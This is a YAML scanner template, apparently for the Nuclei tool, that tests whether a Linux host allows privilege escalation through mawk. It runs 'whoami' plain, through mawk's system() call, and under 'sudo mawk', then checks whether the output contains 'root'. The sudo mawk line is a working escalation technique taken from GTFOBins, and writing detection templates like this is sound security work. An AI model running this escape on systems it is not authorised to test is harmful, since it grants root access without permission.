code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'mawk ''BEGIN {system("whoami")}''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo mawk ''BEGIN {system("whoami")}''

    '
id: privesc-mawk
info:
  author: daffainfo
  description: 'mawk is an efficient and fast implementation of the AWK programming
    language. It is designed to be smaller and faster than the original AWK implementation,
    making it suitable for large data processing tasks. mawk is commonly used for
    text processing and pattern scanning in shell scripts and command-line environments.

    '
  metadata:
    max-request: 3
    verified: true
  name: mawk - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/mawk/
  severity: high
  tags: code,linux,mawk,privesc,local
self-contained: true
